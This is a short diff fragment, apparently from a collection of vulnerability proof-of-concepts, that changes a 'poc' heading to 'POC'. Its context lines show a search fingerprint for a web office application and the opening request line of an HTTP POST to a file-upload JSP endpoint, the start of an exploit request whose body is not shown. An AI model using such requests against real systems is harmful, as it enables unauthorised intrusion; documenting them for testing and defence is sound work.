@@ -8,7 +8,7 @@
 body="/jsoa/webmail/ajax_util.js"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1 HTTP/1.1
